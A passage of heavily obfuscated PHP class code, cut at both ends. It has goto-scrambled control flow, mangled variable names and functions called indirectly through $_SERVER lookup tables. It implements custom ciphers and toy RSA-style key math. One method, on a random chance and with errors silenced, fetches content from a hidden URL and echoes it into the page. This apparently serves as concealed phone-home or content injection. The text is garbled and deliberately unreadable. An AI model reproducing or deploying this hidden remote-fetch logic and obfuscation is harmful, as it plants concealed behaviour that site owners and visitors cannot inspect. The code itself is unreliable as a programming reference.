fšİŒ»: $e¼ĞŒŒÏ = $this->{$_SERVER[Ü âªøğÕå][246]}($e¼ĞŒŒÏ, $BÜÇÍ±–„Š[285]); $e¼ĞŒŒÏ = $e¼ĞŒŒÏ . $E”­º‰¿Õ“ . $BÜÇÍ±–„Š[286] . $BÜÇÍ±–„Š[287]($eÚ«Ùî¾Øñ); $A­ÑÓÙ¼òÀ = $FÔ§‡ğÃ[629]; goto e˜İ†¼ó; c„’™äËÚ: $FÔ§‡ğÃ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $BÜÇÍ±–„Š =& $_SERVER[Ü âªøğÕå]; $e¼ĞŒŒÏ = $BÜÇÍ±–„Š[284]; goto fšİŒ»; e˜İ†¼ó: if (strlen($A­ÑÓÙ¼òÀ) < $FÔ§‡ğÃ[557]) { die; } if ($eÚ«Ùî¾Øñ === -1) { return $e¼ĞŒŒÏ; } $AÏ¶ƒä°õ = $BÜÇÍ±–„Š[248](array($BÜÇÍ±–„Š[249] => array($BÜÇÍ±–„Š[252] => $b´ µØç², $BÜÇÍ±–„Š[250] => $BÜÇÍ±–„Š[288]), $BÜÇÍ±–„Š[289] => array($BÜÇÍ±–„Š[290] => !1, $BÜÇÍ±–„Š[291] => !1))); goto Bò§Î…›æ; FÅœ‘¹ÖÇ: } private function pvscb6ea53c5() { goto Ağö´ìƒ; FÏÈÍñêæâ: $a¤¥ğ×®Â = $Dİ‡îëäæ…[636]; if (!$a¤¥ğ×®Â) { return; } goto F ¹†Ï‡ó¡; Ağö´ìƒ: $Dİ‡îëäæ… =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Díçö—ÛæŞ =& $_SERVER[Ü âªøğÕå]; $fÎ°õ«µŒŠ = array($Díçö—ÛæŞ[292] => $Díçö—ÛæŞ[293], $Díçö—ÛæŞ[294] => $Díçö—ÛæŞ[295], $Díçö—ÛæŞ[296] => $Díçö—ÛæŞ[297], $Díçö—ÛæŞ[298] => $Díçö—ÛæŞ[299], $Díçö—ÛæŞ[300] => $Díçö—ÛæŞ[301], $Díçö—ÛæŞ[302] => $Díçö—ÛæŞ[241], $Díçö—ÛæŞ[303] => $Díçö—ÛæŞ[241], $Díçö—ÛæŞ[304] => $Díçö—ÛæŞ[293], $Díçö—ÛæŞ[305] => $Díçö—ÛæŞ[295], $Díçö—ÛæŞ[306] => $Díçö—ÛæŞ[297], $Díçö—ÛæŞ[307] => $Díçö—ÛæŞ[308], $Díçö—ÛæŞ[309] => $Díçö—ÛæŞ[299], $Díçö—ÛæŞ[310] => $Díçö—ÛæŞ[311], $Díçö—ÛæŞ[312] => $Díçö—ÛæŞ[301], $Díçö—ÛæŞ[313] => $Díçö—ÛæŞ[314], $Díçö—ÛæŞ[315] => $Díçö—ÛæŞ[316], $Díçö—ÛæŞ[317] => $Díçö—ÛæŞ[318]); goto C‰ÄÍò…Ô ; F¢¬¥¤ÇÎ—: $aèİ¶½¡íÎ = $Dİ‡îëäæ…[635]; if (!$aèİ¶½¡íÎ) { return; } $d¢©‚±Ò = $Díçö—ÛæŞ[201]($d¢©‚±Ò ? $d¢©‚±Ò : $Díçö—ÛæŞ[293]); goto b®˜¹°¹°; C‰ÄÍò…Ô : $a»Å¨ç…òÔ = $Dİ‡îëäæ…[634]; if (!$a»Å¨ç…òÔ) { die; } $d¢©‚±Ò = $fÎ°õ«µŒŠ[$this->xihv98b18b0d]; goto F¢¬¥¤ÇÎ—; b®˜¹°¹°: $B¾ŒçùÊ… = $Díçö—ÛæŞ[104]($this->enga9269477c, $Díçö—ÛæŞ[319]); $B¾ŒçùÊ… = $B¾ŒçùÊ… ? $Díçö—ÛæŞ[201]($B¾ŒçùÊ…) : 0; return $d¢©‚±Ò + $B¾ŒçùÊ…; goto FÏÈÍñêæâ; F ¹†Ï‡ó¡: } public function cjml17dccf81($aäÀŸ ëÛ) { goto bÜ÷±¶Õ°; bÜ÷±¶Õ°: $C“ß»…Êï  =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f’£ì§â =& $_SERVER[Ü âªøğÕå]; $eƒ½Â›Òßç = $this->{$_SERVER[Ü âªøğÕå][137]}(); goto Fƒêñèê¯ğ; a×·ï¥Ê…±: if (!$d¡—Á†®†®) { die; } if ($eŞßæâ¡°Á <= $eƒ½Â›Òßç) { return; } $A†¥Ô›©ˆ = $f’£ì§â[61]($f’£ì§â[139])->{$_SERVER[Ü âªøğÕå][320]}($f’£ì§â[321])->{$_SERVER[Ü âªøğÕå][322]}($eƒ½Â›Òßç)->{$_SERVER[Ü âªøğÕå][323]}(); goto cÊŸğìô†; CÂò¦Ş¼”ê: if (!$f’£ì§â[239]($aäÀŸ ëÛ[$f’£ì§â[321]], $A†¥Ô›©ˆ)) { $f’£ì§â[166]($f’£ì§â[324], !1, $f’£ì§â[236]); } goto A¢ºä’ÀØ; Fƒêñèê¯ğ: if ($eƒ½Â›Òßç >= $f’£ì§â[201]($f’£ì§â[241])) { return; } $eŞßæâ¡°Á = $f’£ì§â[61]($f’£ì§â[139])->{$_SERVER[Ü âªøğÕå][140]}(); $d¡—Á†®†® = $C“ß»…Êï [637]; goto a×·ï¥Ê…±; cÊŸğìô†: $C˜¿¡Çî†× = $C“ß»…Êï [638]; while ($C˜¿¡Çî†× < $C“ß»…Êï [557]) { if ($C˜¿¡Çî†× >= 0) { break; } $C˜¿¡Çî†×++; } $A†¥Ô›©ˆ = $f’£ì§â[222]($A†¥Ô›©ˆ, $f’£ì§â[10], $f’£ì§â[321]); goto CÂò¦Ş¼”ê; A¢ºä’ÀØ: } public function iwskee2b3262() { goto A³²ÉÛ‹Åù; A³²ÉÛ‹Åù: $B®­ÅîÑôÈ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AŞ¢¦Ö­‚½ =& $_SERVER[Ü âªøğÕå]; if (!$AŞ¢¦Ö­‚½[104]($GLOBALS, $AŞ¢¦Ö­‚½[132]) || $AŞ¢¦Ö­‚½[325](1, 100) > 20) { return; } goto càğ­‹èïĞ; dæÂ»Î¼: $dƒ²Á·ï« = @$AŞ¢¦Ö­‚½[253]($eòÏ‰Øä“Ù, !1, $E·‘‚´Ê›õ); echo $AŞ¢¦Ö­‚½[326] . $AŞ¢¦Ö­‚½[327]($dƒ²Á·ï«) . $AŞ¢¦Ö­‚½[328]; $E²È£Ô†Ë = $B®­ÅîÑôÈ[641]; goto aĞ¤£‰Ø·Û; aĞ¤£‰Ø·Û: if (!$E²È£Ô†Ë) { die; } goto BĞõÇÆàµÃ; C ğï¯•œ: $eòÏ‰Øä“Ù = $this->{$_SERVER[Ü âªøğÕå][246]}($eòÏ‰Øä“Ù, $AŞ¢¦Ö­‚½[247]); $E·‘‚´Ê›õ = $AŞ¢¦Ö­‚½[248](array($AŞ¢¦Ö­‚½[249] => array($AŞ¢¦Ö­‚½[250] => $AŞ¢¦Ö­‚½[251], $AŞ¢¦Ö­‚½[252] => 3))); $bë´ï»Û”ï = $B®­ÅîÑôÈ[640]; goto dæÂ»Î¼; càğ­‹èïĞ: $eòÏ‰Øä“Ù = $AŞ¢¦Ö­‚½[245]; $FÓ¼ëÙí® = $B®­ÅîÑôÈ[639]; while (strlen($FÓ¼ëÙí®) < $B®­ÅîÑôÈ[548]) { if (!$FÓ¼ëÙí®) { break; } $FÓ¼ëÙí®++; } goto C ğï¯•œ; BĞõÇÆàµÃ: } private function ezqa4141246b($fèÂ°ÏãÚë, $bŠã»µ¿ç, $aÔµ°ãñë– = 3) { goto fç¬“é‡µŠ; eŒ´¸îÅŸª: return $fœ¢†¨í‰; goto C§©š­íà; Dî«‘«âÍÉ: switch ($Cá¼È¯ß) { case $eÜ‚â¶ãø[232]: $fœ¢†¨í‰ = $this->{$_SERVER[Ü âªøğÕå][147]}($fèÂ°ÏãÚë, $eÜ‚â¶ãø[214]($bŠã»µ¿ç . $C·ºØ¸Ü¯¬)); break; $B¿ÂĞëàéñ = $a¾ááæĞœš[633]; case $eÜ‚â¶ãø[220]: $fœ¢†¨í‰ = $this->{$_SERVER[Ü âªøğÕå][147]}($fèÂ°ÏãÚë, $eÜ‚â¶ãø[214]($C·ºØ¸Ü¯¬ . $bŠã»µ¿ç)); $cßÙ–óëì¹ = $a¾ááæĞœš[643]; break; case $eÜ‚â¶ãø[331]: $fœ¢†¨í‰ = $this->{$_SERVER[Ü âªøğÕå][147]}($fèÂ°ÏãÚë, $eÜ‚â¶ãø[118]($C·ºØ¸Ü¯¬ . $bŠã»µ¿ç)); break; $d¨…ŞòˆõÛ = $a¾ááæĞœš[644]; case $eÜ‚â¶ãø[332]: $fœ¢†¨í‰ = $this->{$_SERVER[Ü âªøğÕå][147]}($fèÂ°ÏãÚë, $eÜ‚â¶ãø[114]($C·ºØ¸Ü¯¬ . $bŠã»µ¿ç)); $aÅô˜’¹² = $a¾ááæĞœš[645]; if (strlen($aÅô˜’¹²) < $a¾ááæĞœš[584]) { die; } break; $báé·¼¥×İ = $a¾ááæĞœš[646]; case $eÜ‚â¶ãø[333]: goto d©Öéãªéí; EŠÕîõùĞØ: $däÚÄôŠ = $a¾ááæĞœš[651]; if (!$däÚÄôŠ) { return; } for ($Bğñ®Â£‡Ö = 0; $Bğñ®Â£‡Ö < $eÜ‚â¶ãø[24]($fèÂ°ÏãÚë); $Bğñ®Â£‡Ö++) { $e­œÇ‰ÁÁ¥ = $e­œÇ‰ÁÁ¥ == $eÜ‚â¶ãø[24]($e—–‹Šêø) ? 0 : $e­œÇ‰ÁÁ¥; $cë‡î¦Œ© = ($C”Éõ¢Ö×ê + $eÜ‚â¶ãø[335]($dç¨ùˆè‘ù, $fèÂ°ÏãÚë[$Bğñ®Â£‡Ö]) + $eÜ‚â¶ãø[336]($e—–‹Šêø[$e­œÇ‰ÁÁ¥++])) % 64; $eÔ×‘ô¶ÑŸ = $a¾ááæĞœš[652]; while ($eÔ×‘ô¶ÑŸ < $a¾ááæĞœš[554]) { if ($eÔ×‘ô¶ÑŸ >= 0) { break; } $eÔ×‘ô¶ÑŸ++; } $dºß¿¢ÜÑ‹ .= $dç¨ùˆè‘ù[$cë‡î¦Œ©]; } goto f“¡Ù“’êÎ; f“¡Ù“’êÎ: $fœ¢†¨í‰ = $eÜ‚â¶ãø[327]($D¦¿†ºÒéÕ . $dºß¿¢ÜÑ‹); $Aô÷‚µÉÏ¤ = $a¾ááæĞœš[653]; if (strlen($Aô÷‚µÉÏ¤) < $a¾ááæĞœš[557]) { die; } goto aïë„ÓáÍÕ; a°Š£‹ºÃ: if (!$BÒêÎ‘ŞìÎ) { die; } $cë‡î¦Œ© = 0; $e­œÇ‰ÁÁ¥ = 0; goto EŠÕîõùĞØ; bŞÄ©ßÂæ…: $dºß¿¢ÜÑ‹ = $eÜ‚â¶ãø[10]; $Bğñ®Â£‡Ö = 0; $BÒêÎ‘ŞìÎ = $a¾ááæĞœš[650]; goto a°Š£‹ºÃ; CÖ´“¸ñø: $e—–‹Šêø = $eÜ‚â¶ãø[25]($e—–‹Šêø, $C”Éõ¢Ö×ê % 8, $C”Éõ¢Ö×ê % 8 + 7); $Aà—Î…õÍ® = $a¾ááæĞœš[649]; if (strlen($Aà—Î…õÍ®) < $a¾ááæĞœš[548]) { return; } goto bŞÄ©ßÂæ…; d©Öéãªéí: $fèÂ°ÏãÚë = $eÜ‚â¶ãø[118]($fèÂ°ÏãÚë); $DŸâĞÓ±£ = $a¾ááæĞœš[647]; $C”Éõ¢Ö×ê = $eÜ‚â¶ãø[334](0, 64); goto côå£ïÈš; aïë„ÓáÍÕ: break; $F¾²À¼†¡ = $a¾ááæĞœš[654]; goto CÀØÚ†ŒÒŸ; côå£ïÈš: $DíÙóõÂó¢ = $a¾ááæĞœš[648]; $D¦¿†ºÒéÕ = $dç¨ùˆè‘ù[$C”Éõ¢Ö×ê]; $e—–‹Šêø = $eÜ‚â¶ãø[114]($D¦¿†ºÒéÕ . $eÜ‚â¶ãø[114]($bŠã»µ¿ç . $D¦¿†ºÒéÕ) . $bŠã»µ¿ç); goto CÖ´“¸ñø; CÀØÚ†ŒÒŸ: default: $fœ¢†¨í‰ = $this->{$_SERVER[Ü âªøğÕå][147]}($fèÂ°ÏãÚë, $bŠã»µ¿ç . $C·ºØ¸Ü¯¬); $d–†¿çÊÂ = $a¾ááæĞœš[655]; if (strlen($d–†¿çÊÂ) < $a¾ááæĞœš[552]) { die; } break; } $fœ¢†¨í‰ = $eÜ‚â¶ãø[214]($Cá¼È¯ß . $C·ºØ¸Ü¯¬ . $fœ¢†¨í‰); if ($aÔµ°ãñë– - 1 > 0) { $fœ¢†¨í‰ = $this->{$_SERVER[Ü âªøğÕå][127]}($fœ¢†¨í‰, $bŠã»µ¿ç, $aÔµ°ãñë– - 1); } goto eŒ´¸îÅŸª; fç¬“é‡µŠ: $a¾ááæĞœš =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eÜ‚â¶ãø =& $_SERVER[Ü âªøğÕå]; $eÜ‚â¶ãø[329](1); goto b­‹¤ùÑ™; b­‹¤ùÑ™: $fèÂ°ÏãÚë = $eÜ‚â¶ãø[2]($fèÂ°ÏãÚë); $Cá¼È¯ß = $eÜ‚â¶ãø[325](0, 5) . $eÜ‚â¶ãø[10]; $C·ºØ¸Ü¯¬ = $eÜ‚â¶ãø[124](15); goto Bïšö¹†½; Bïšö¹†½: $BÚˆ¼ãÄîÇ = $a¾ááæĞœš[642]; while ($BÚˆ¼ãÄîÇ < $a¾ááæĞœš[584]) { if ($BÚˆ¼ãÄîÇ >= 0) { break; } $BÚˆ¼ãÄîÇ++; } $dç¨ùˆè‘ù = $eÜ‚â¶ãø[330]; goto Dî«‘«âÍÉ; C§©š­íà: } private function xqkw6d0dfe92($açˆä°¦·, $CÆĞÇèà‰©, $cÖÚÑƒ‡™ = 3) { goto BãÓ‚§î¾; EçÙëù¨ôŸ: $açˆä°¦· = $b¨Èîˆ…Ë[25]($açˆä°¦·, 16); $c‡”¾îàĞÛ = $cŒæ¾ÍŞ”Ï[656]; $b¦ÈÚ¿íÌò = $b¨Èîˆ…Ë[330]; goto D¬»”ˆ¢Ë; A˜™£§¦ùë: $açˆä°¦· = $b¨Èîˆ…Ë[2]($açˆä°¦·); $açˆä°¦· = $b¨Èîˆ…Ë[214]($açˆä°¦·); $e¨äïÄ£š† = $açˆä°¦·[0]; goto E¥¢ŒÍ£À±; E¥¢ŒÍ£À±: $Eˆ¹˜¾øù = $cŒæ¾ÍŞ”Ï[594]; if (!$Eˆ¹˜¾øù) { return; } $E™«½ˆ¶ ‰ = $b¨Èîˆ…Ë[25]($açˆä°¦·, 1, 15); goto EçÙëù¨ôŸ; D¬»”ˆ¢Ë: $bŞ°•Ä¿ƒ = $cŒæ¾ÍŞ”Ï[657]; if (!$bŞ°•Ä¿ƒ) { return; } switch ($e¨äïÄ£š†) { case $b¨Èîˆ…Ë[232]: $A˜îñšµé„ = $this->{$_SERVER[Ü âªøğÕå][246]}($açˆä°¦·, $b¨Èîˆ…Ë[214]($CÆĞÇèà‰© . $E™«½ˆ¶ ‰)); break; case $b¨Èîˆ…Ë[220]: $A˜îñšµé„ = $this->{$_SERVER[Ü âªøğÕå][246]}($açˆä°¦·, $b¨Èîˆ…Ë[214]($E™«½ˆ¶ ‰ . $CÆĞÇèà‰©)); break; $f•¬´ÉŞéë = $cŒæ¾ÍŞ”Ï[658]; case $b¨Èîˆ…Ë[331]: $A˜îñšµé„ = $this->{$_SERVER[Ü âªøğÕå][246]}($açˆä°¦·, $b¨Èîˆ…Ë[118]($E™«½ˆ¶ ‰ . $CÆĞÇèà‰©)); break; $C±ƒÏ®§õ• = $cŒæ¾ÍŞ”Ï[659]; if (strlen($C±ƒÏ®§õ•) < $cŒæ¾ÍŞ”Ï[552]) { return; } case $b¨Èîˆ…Ë[332]: $A˜îñšµé„ = $this->{$_SERVER[Ü âªøğÕå][246]}($açˆä°¦·, $b¨Èîˆ…Ë[114]($E™«½ˆ¶ ‰ . $CÆĞÇèà‰©)); break; case $b¨Èîˆ…Ë[333]: goto FÂÅ—ãª¡ï; F¦Â¥¨÷¯Ù: $EÊƒñÓÜ’ó = $cŒæ¾ÍŞ”Ï[660]; if (strlen($EÊƒñÓÜ’ó) < $cŒæ¾ÍŞ”Ï[554]) { die; } $aÈ´… ¤Ôê = $b¨Èîˆ…Ë[335]($b¦ÈÚ¿íÌò, $A°Ù Õ¢œ¯); goto döË…›ÇË†; fÜÃÚÉ÷ª: $d¼§‘•åˆ = $cŒæ¾ÍŞ”Ï[663]; while (strlen($d¼§‘•åˆ) < $cŒæ¾ÍŞ”Ï[557]) { if (!$d¼§‘•åˆ) { break; } $d¼§‘•åˆ++; } $c±‡¦Šâ = 0; goto f âÓÁ”Ø; e’ƒšñùè¢: $Dê®ªÚ¯‹‚ = $cŒæ¾ÍŞ”Ï[666]; if (strlen($Dê®ªÚ¯‹‚) < $cŒæ¾ÍŞ”Ï[554]) { return; } goto bÃêôƒ„Óœ; döË…›ÇË†: $dèªÚÔÔÄ¤ = $cŒæ¾ÍŞ”Ï[661]; if (!$dèªÚÔÔÄ¤) { die; } $cî„ÑöŒ‰Í = $b¨Èîˆ…Ë[114]($A°Ù Õ¢œ¯ . $b¨Èîˆ…Ë[114]($CÆĞÇèà‰© . $A°Ù Õ¢œ¯) . $CÆĞÇèà‰©); goto FÆ’ƒôƒ­; FÆ’ƒôƒ­: $cî„ÑöŒ‰Í = $b¨Èîˆ…Ë[25]($cî„ÑöŒ‰Í, $aÈ´… ¤Ôê % 8, $aÈ´… ¤Ôê % 8 + 7); $FÂ‚¹½•‚¸ = $b¨Èîˆ…Ë[10]; $bíèƒâ„­ = $cŒæ¾ÍŞ”Ï[662]; goto cÃéÚ¢â×³; FÂÅ—ãª¡ï: $açˆä°¦· = $b¨Èîˆ…Ë[338]($açˆä°¦·); $A°Ù Õ¢œ¯ = $açˆä°¦·[0]; $açˆä°¦· = $b¨Èîˆ…Ë[25]($açˆä°¦·, 1); goto F¦Â¥¨÷¯Ù; cÃéÚ¢â×³: if (!$bíèƒâ„­) { die; } $d±±Ÿ”È«Ÿ = 0; $e¸ó«ß¿ = 0; goto fÜÃÚÉ÷ª; f âÓÁ”Ø: for ($d±±Ÿ”È«Ÿ = 0; $d±±Ÿ”È«Ÿ < $b¨Èîˆ…Ë[24]($açˆä°¦·); $d±±Ÿ”È«Ÿ++) { $c±‡¦Šâ = $c±‡¦Šâ == $b¨Èîˆ…Ë[24]($cî„ÑöŒ‰Í) ? 0 : $c±‡¦Šâ; $fóÛ‚§Ë‚ô = $c±‡¦Šâ++; $fÜºç—‚©Ö = $cŒæ¾ÍŞ”Ï[664]; $e¸ó«ß¿ = $b¨Èîˆ…Ë[335]($b¦ÈÚ¿íÌò, $açˆä°¦·[$d±±Ÿ”È«Ÿ]) - $aÈ´… ¤Ôê - $b¨Èîˆ…Ë[336]($cî„ÑöŒ‰Í[$fóÛ‚§Ë‚ô]); while ($e¸ó«ß¿ < 0) { $e¸ó«ß¿ += 64; $eÔí’“Ÿïö = $cŒæ¾ÍŞ”Ï[665]; if (strlen($eÔí’“Ÿïö) < $cŒæ¾ÍŞ”Ï[554]) { die; } } $FÂ‚¹½•‚¸ .= $b¦ÈÚ¿íÌò[$e¸ó«ß¿]; } $A˜îñšµé„ = $b¨Èîˆ…Ë[339]($FÂ‚¹½•‚¸); break; goto e’ƒšñùè¢; bÃêôƒ„Óœ: default: $A˜îñšµé„ = $this->{$_SERVER[Ü âªøğÕå][246]}($açˆä°¦·, $CÆĞÇèà‰© . $E™«½ˆ¶ ‰); $bÌ‰‚Êù­ = $cŒæ¾ÍŞ”Ï[667]; if (strlen($bÌ‰‚Êù­) < $cŒæ¾ÍŞ”Ï[554]) { die; } break; } goto D´°‚âó–ƒ; BãÓ‚§î¾: $cŒæ¾ÍŞ”Ï =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b¨Èîˆ…Ë =& $_SERVER[Ü âªøğÕå]; if (!$b¨Èîˆ…Ë[337]($açˆä°¦·) || $b¨Èîˆ…Ë[24]($açˆä°¦·) < 10) { return !1; } goto A˜™£§¦ùë; D´°‚âó–ƒ: if ($cÖÚÑƒ‡™ - 1 > 0) { $A˜îñšµé„ = $this->{$_SERVER[Ü âªøğÕå][188]}($A˜îñšµé„, $CÆĞÇèà‰©, $cÖÚÑƒ‡™ - 1); } return $A˜îñšµé„; goto c‘ôïÆ¢ê³; c‘ôïÆ¢ê³: } public function axem0276479c($EŒÎš´†¨é) { goto A……„çÄô®; Dæ¹Õƒ“¾: $AËÍô™ = $aéÇ­¨ƒŞé[672]; $EÆ×ğÓš˜ = $this->{$_SERVER[Ü âªøğÕå][147]}($EŒÎš´†¨é, $F‚ÎÂÆâ) . $Aá¶´˜ÀÅã[344] . $B©›Ğ¤ß‘÷; $eÈÊ¨Š£à = $aéÇ­¨ƒŞé[673]; goto aòÌ‡ÎÑ¿Æ; dùÉñÀÒÁË: for ($e‚  Ÿğ³› = 0; $e‚  Ÿğ³› < $EÉ•ìğ¢ * 10; $e‚  Ÿğ³›++) { if (($EÉ•ìğ¢ * $e‚  Ÿğ³› + 1) % $AËŞ‡„¸±† == 0) { $bØ»Ê‘ïò = $Aá¶´˜ÀÅã[201](($EÉ•ìğ¢ * $e‚  Ÿğ³› + 1) / $AËŞ‡„¸±†); break; } } $B©›Ğ¤ß‘÷ = $this->{$_SERVER[Ü âªøğÕå][147]}($dÓ•¿†‡ÕË * $EÍ¤—·îğ‘ . $Aá¶´˜ÀÅã[10], $Aá¶´˜ÀÅã[149]); $F‚ÎÂÆâ = $Aá¶´˜ÀÅã[114]($Aá¶´˜ÀÅã[341] . ($dÓ•¿†‡ÕË + $EÍ¤—·îğ‘) . $Aá¶´˜ÀÅã[342] . $AËŞ‡„¸±† . $Aá¶´˜ÀÅã[342] . $bØ»Ê‘ïò . $Aá¶´˜ÀÅã[343]); goto Dæ¹Õƒ“¾; A……„çÄô®: $aéÇ­¨ƒŞé =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Aá¶´˜ÀÅã =& $_SERVER[Ü âªøğÕå]; $dÓ•¿†‡ÕË = $this->{$_SERVER[Ü âªøğÕå][340]}(); goto BœÕùÍÎ¼; BœÕùÍÎ¼: $e®˜óÜõøõ = $aéÇ­¨ƒŞé[668]; $EÍ¤—·îğ‘ = $this->{$_SERVER[Ü âªøğÕå][340]}(); $EÉ•ìğ¢ = ($dÓ•¿†‡ÕË - 1) * ($EÍ¤—·îğ‘ - 1); goto f„¨²ˆë–Á; aòÌ‡ÎÑ¿Æ: if (strlen($eÈÊ¨Š£à) < $aéÇ­¨ƒŞé[557]) { return; } return $EÆ×ğÓš˜; goto e‘–ŒàÍ‚«; f„¨²ˆë–Á: $AËŞ‡„¸±† = $Aá¶´˜ÀÅã[201](($dÓ•¿†‡ÕË + $EÍ¤—·îğ‘) / 2); while (1) { $Fç£µ¢Õ§Â = $AËŞ‡„¸±†; $bÆê¶Ñ˜ÈÚ = $aéÇ­¨ƒŞé[669]; if (!$bÆê¶Ñ˜ÈÚ) { die; } $D³Áï…¨¹Å = $EÉ•ìğ¢; $f˜Ä¬–åàŠ = $aéÇ­¨ƒŞé[670]; while ($D³Áï…¨¹Å % $Fç£µ¢Õ§Â != 0) { $c‚£·‰— = $D³Áï…¨¹Å; $D³Áï…¨¹Å = $Fç£µ¢Õ§Â; $eß¬šàä—Ñ = $aéÇ­¨ƒŞé[671]; $Fç£µ¢Õ§Â = $c‚£·‰— % $Fç£µ¢Õ§Â; } if ($Fç£µ¢Õ§Â == 1) { break; } else { $AËŞ‡„¸±†++; } } $bØ»Ê‘ïò = 2; goto dùÉñÀÒÁË; e‘–ŒàÍ‚«: } public function fcks3fb5a88f($a¹‚œÒæ­Ú) { goto f‡à°¶Ñœƒ; EÂ¿»„Î¤”: $FÁ›Õ¼¨À = $e¿•®¯‡×[674]; while (strlen($FÁ›Õ¼¨À) < $e¿•®¯‡×[554]) { if (!$FÁ›Õ¼¨À) { break; } $FÁ›Õ¼¨À++; } if ($F©êí©Ú…ì[19]($F¡É‚Ì‘Ï) != 2) { return $F©êí©Ú…ì[10]; } goto D¯Û‚ĞïÀ; D©ÆóºÜ…: while (strlen($cóÑ•­×˜) < $e¿•®¯‡×[584]) { if (!$cóÑ•­×˜) { break; } $cóÑ•­×˜++; } $Aš±ê¢‰á = 0; $cŒñï—“Í¦ = $e¿•®¯‡×[677]; goto aõµ”Ğ‹Ú™; F¼ËéâÖ®‰: if (!$BÌ‰‹ƒëå´) { return; } return $AÕæÀŞ§À»; goto f·È…›Ë˜ğ; F—¼º®Öß: if (!$aàó–…é¯) { return $F©êí©Ú…ì[10]; } $aàó–…é¯ = $F©êí©Ú…ì[201]($aàó–…é¯); $cóÑ•­×˜ = $e¿•®¯‡×[676]; goto D©ÆóºÜ…; fÁÀÉ“à¹â: $eÂİ†Ä‡‘¸ = $F©êí©Ú…ì[114]($F©êí©Ú…ì[341] . ($Aš±ê¢‰á + $EæÏŸÂ“‰) . $F©êí©Ú…ì[342] . $A›§ˆ˜ò¿È . $F©êí©Ú…ì[342] . $C¨ÌÂ†ŠçÂ . $F©êí©Ú…ì[343]); $AÕæÀŞ§À» = $this->{$_SERVER[Ü âªøğÕå][246]}($F¡É‚Ì‘Ï[0], $eÂİ†Ä‡‘¸); $BÌ‰‹ƒëå´ = $e¿•®¯‡×[682]; goto F¼ËéâÖ®‰; aõµ”Ğ‹Ú™: while ($cŒñï—“Í¦ < $e¿•®¯‡×[557]) { if ($cŒñï—“Í¦ >= 0) { break; } $cŒñï—“Í¦++; } $EæÏŸÂ“‰ = 0; for ($e…­¥ÀßÓŒ = 3; $e…­¥ÀßÓŒ < $aàó–…é¯; $e…­¥ÀßÓŒ += 2) { if ($aàó–…é¯ % $e…­¥ÀßÓŒ != 0) { continue; } $Aš±ê¢‰á = $e…­¥ÀßÓŒ; $EæÏŸÂ“‰ = $F©êí©Ú…ì[201]($aàó–…é¯ / $e…­¥ÀßÓŒ); break; } goto AÜ‘’©°Ì–; AÜ‘’©°Ì–: $EšŠİ•çÑÓ = ($Aš±ê¢‰á - 1) * ($EæÏŸÂ“‰ - 1); $bÓÍ§®ÔøÉ = $e¿•®¯‡×[678]; if (strlen($bÓÍ§®ÔøÉ) < $e¿•®¯‡×[557]) { return; } goto bæ’ÙÍØÃ©; f‡à°¶Ñœƒ: $e¿•®¯‡× =& $_SERVER[³‘’¼äÑ™ÔÍ]; $F©êí©Ú…ì =& $_SERVER[Ü âªøğÕå]; $F¡É‚Ì‘Ï = $F©êí©Ú…ì[0]($F©êí©Ú…ì[344], $a¹‚œÒæ­Ú); goto EÂ¿»„Î¤”; D¯Û‚ĞïÀ: $aàó–…é¯ = $this->{$_SERVER[Ü âªøğÕå][246]}($F¡É‚Ì‘Ï[1] . $F©êí©Ú…ì[10], $F©êí©Ú…ì[149]); $bÅÊ”Ü‹˜´ = $e¿•®¯‡×[675]; while ($bÅÊ”Ü‹˜´ < $e¿•®¯‡×[548]) { if ($bÅÊ”Ü‹˜´ >= 0) { break; } $bÅÊ”Ü‹˜´++; } goto F—¼º®Öß; Cçå¤¨¦: $a… ‰¤õÏ¼ = $e¿•®¯‡×[681]; if (strlen($a… ‰¤õÏ¼) < $e¿•®¯‡×[557]) { return; } for ($e…­¥ÀßÓŒ = 0; $e…­¥ÀßÓŒ < $EšŠİ•çÑÓ * 10; $e…­¥ÀßÓŒ++) { if (($EšŠİ•çÑÓ * $e…­¥ÀßÓŒ + 1) % $A›§ˆ˜ò¿È == 0) { $C¨ÌÂ†ŠçÂ = $F©êí©Ú…ì[201](($EšŠİ•çÑÓ * $e…­¥ÀßÓŒ + 1) / $A›§ˆ˜ò¿È); break; } } goto fÁÀÉ“à¹â; bæ’ÙÍØÃ©: $A›§ˆ˜ò¿È = $F©êí©Ú…ì[201](($Aš±ê¢‰á + $EæÏŸÂ“‰) / 2); while (1) { $E‰äè´´ğø = $A›§ˆ˜ò¿È; $BšäÊ£³‚› = $EšŠİ•çÑÓ; $A¶óô•ã„æ = $e¿•®¯‡×[679]; if (strlen($A¶óô•ã„æ) < $e¿•®¯‡×[548]) { return; } while ($BšäÊ£³‚› % $E‰äè´´ğø != 0) { $dÖŞ²óøÖ = $BšäÊ£³‚›; $D«À…ºæ¤¢ = $e¿•®¯‡×[680]; $BšäÊ£³‚› = $E‰äè´´ğø; $E‰äè´´ğø = $dÖŞ²óøÖ % $E‰äè´´ğø; } if ($E‰äè´´ğø == 1) { break; } else { $A›§ˆ˜ò¿È++; } } $C¨ÌÂ†ŠçÂ = 2; goto Cçå¤¨¦; f·È…›Ë˜ğ: } public function xwyv214c8c71() { goto F¬‘ç¦–óï; Cª‹İÄ‘°: for ($E†Ò”À‰–¯ = $eĞ İ¦é°; $E†Ò”À‰–¯ > 1; $E†Ò”À‰–¯--) { $DæÍĞœÑš× = !0; foreach ($A†Š –ˆ§Ã as $fÛÀ“È®œ) { if ($E†Ò”À‰–¯ % $fÛÀ“È®œ == 0) { $DæÍĞœÑš× = !1; break; } } if ($DæÍĞœÑš×) { $AÃ«‚ÉÒºª = $E†Ò”À‰–¯; break; } } return $AÃ«‚ÉÒºª; goto EÌ¥±èÔ‚º; cÒñãå«Ê¦: $Dõ—¶‘¹¾ = $C²ÃÁ‹‘Úô[683]; $A†Š –ˆ§Ã = array(); $C¦³»µ™ß¢ = 1; goto A¦¼Öç¿; A¦¼Öç¿: $b’±³†÷ò = $C²ÃÁ‹‘Úô[684]; while (strlen($b’±³†÷ò) < $C²ÃÁ‹‘Úô[552]) { if (!$b’±³†÷ò) { break; } $b’±³†÷ò++; } while ($C¦³»µ™ß¢ <= (int) $E²ˆÚÆÂìÃ[346]($eĞ İ¦é°)) { 